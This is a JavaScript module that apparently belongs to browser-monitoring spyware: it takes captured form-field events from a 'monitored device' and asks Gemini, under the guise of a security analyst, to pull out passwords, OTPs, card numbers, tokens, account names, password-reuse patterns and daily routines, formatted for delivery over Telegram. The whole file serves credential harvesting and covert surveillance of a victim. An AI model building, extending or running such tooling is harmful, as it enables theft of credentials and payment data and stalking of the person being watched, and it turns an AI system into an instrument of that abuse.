import { GoogleGenerativeAI } from '@google/generative-ai'

let genAI = null

function getClient() {
    if (!genAI) {
        genAI = new GoogleGenerativeAI(process.env.GEMINI_KEY)
    }
    return genAI
}

export async function analyzeEvents(events) {
    if (!events || events.length === 0) return null

    // format events into readable context for Gemini
    const context = events.map(e => {
        const time = e.time || new Date(e.timestamp).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' })
        const hostname = e.hostname || 'unknown'
        const type = e.type || 'unknown'
        const field = e.field || ''
        const value = e.value || ''
        return `[${time}] ${hostname} | ${type}${field ? ' | ' + field : ''}: ${value}`
    }).join('\n')

    const prompt = `
You are a security analyst reviewing 6 hours of browser activity logs from a monitored device.

Analyze the following activity and provide a structured report with:

1. 🔴 CRITICAL FINDINGS — passwords, OTPs, card numbers, tokens, credentials
2. 🟡 BEHAVIORAL PATTERNS — active hours, most visited sites, habits, routines  
3. 🟢 ACCOUNTS IDENTIFIED — all emails, usernames, accounts found
4. 💡 AI INSIGHTS — password patterns, reuse across sites, correlations, risk indicators
5. ⚠️ RISK SCORE — rate overall risk 1-10 with brief reason

Rules:
- Be concise and structured
- Use emojis for visual clarity
- Format for Telegram (avoid markdown headers, use emojis instead)
- If nothing sensitive found, say so clearly
- Total response under 800 words

Activity logs (${events.length} events):
${context}
`

    try {
        const model = getClient().getGenerativeModel({ model: 'gemini-2.5-flash' })
        const result = await model.generateContent(prompt)
        const response = await result.response
        return response.text()
    } catch (err) {
        console.error('[Gemini] Analysis failed:', err.message)
        return `⚠️ AI analysis failed: ${err.message}`
    }
}
